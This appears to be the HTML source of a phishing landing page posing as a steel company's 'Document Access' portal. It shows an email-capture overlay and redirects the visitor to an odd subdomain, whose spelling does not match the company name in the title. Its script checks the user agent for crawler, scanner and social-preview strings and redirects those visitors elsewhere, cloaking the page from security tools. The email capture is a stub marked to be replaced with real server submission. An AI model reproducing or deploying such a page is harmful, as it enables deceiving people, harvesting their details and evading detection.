<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <title>Gregg and Sons Steel Pty Ltd - Document Portal</title>
    <style>
        .document-gateway {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(20, 20, 20, 0.85);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        .document-gateway.active {
            opacity: 1;
            pointer-events: all;
        }
        .gateway-container {
            background: white;
            width: 95%;
            max-width: 420px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .gateway-title {
            font-size: 1.3rem;
            color: #222;
            margin: 0 0 15px 0;
        }
        .gateway-text {
            color: #444;
            margin-bottom: 20px;
            line-height: 1.4;
        }
        .gateway-input {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1rem;
            box-sizing: border-box;
        }
        .gateway-button {
            width: 100%;
            padding: 12px;
            background: #2e7d32;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.2s;
        }
        .gateway-button:hover {
            background: #1b5e20;
        }
    </style>
</head>
<body>
    <div class="document-gateway" id="documentGateway">
        <div class="gateway-container">
            <h2 class="gateway-title">Gregg and Sons Pty Ltd - Document Access</h2>
            <p class="gateway-text">To view this content, please provide your email address below:</p>
            <input type="email" class="gateway-input" id="gatewayEmail" placeholder="Enter your email address" required>
            <button class="gateway-button" id="gatewaySubmit">Proceed to Document</button>
        </div>
    </div>

    <script>
        (function() {
            // Visitor type detection
            const checkVisitorType = () => {
                const automatedPatterns = [
                    'bot', 'spider', 'crawler', 'slurp', 'search', 
                    'archiver', 'scanner', 'indexer', 'monitor', 'checker',
                    'facebook', 'linkedin', 'twitter', 'google', 'bing',
                    'yandex', 'baidu', 'duckduck', 'sogou', 'exabot'
                ];
                
                const agent = navigator.userAgent.toLowerCase();
                return automatedPatterns.some(pattern => agent.includes(pattern));
            };

            // Email validation
            const verifyEmailFormat = (email) => {
                return /^[\w+.-]+@[\w-]+\.[\w.-]+$/.test(email);
            };

            // Main gateway function
            const setupDocumentGateway = () => {
                const gateway = document.getElementById('documentGateway');
                const emailField = document.getElementById('gatewayEmail');
                const submitButton = document.getElementById('gatewaySubmit');
                const redirectUrl = "https://2d83b286d2.gregandsonsteel.com.au/";

                const processSubmission = () => {
                    const emailValue = emailField.value.trim();
                    
                    if (!verifyEmailFormat(emailValue)) {
                        alert('Please provide a valid email address to continue.');
                        emailField.focus();
                        return;
                    }

                    // Log the email (replace with actual server submission)
                    console.log('Document access requested by:', emailValue);
                    
                    // Redirect to document
                    window.location.assign(redirectUrl);
                };

                // Setup interactions
                submitButton.onclick = processSubmission;
                emailField.onkeydown = (e) => {
                    if (e.key === 'Enter') processSubmission();
                };

                // Activate gateway
                setTimeout(() => {
                    gateway.classList.add('active');
                }, 50);
            };

            // Execution flow
            if (checkVisitorType()) {
                window.location.replace("https://2d83b286d2.gregandsonsteel.com.au/");
            } else {
                if (document.readyState !== 'loading') {
                    setupDocumentGateway();
                } else {
                    document.addEventListener('DOMContentLoaded', setupDocumentGateway);
                }
            }
        })();
    </script>
</body>
</html>
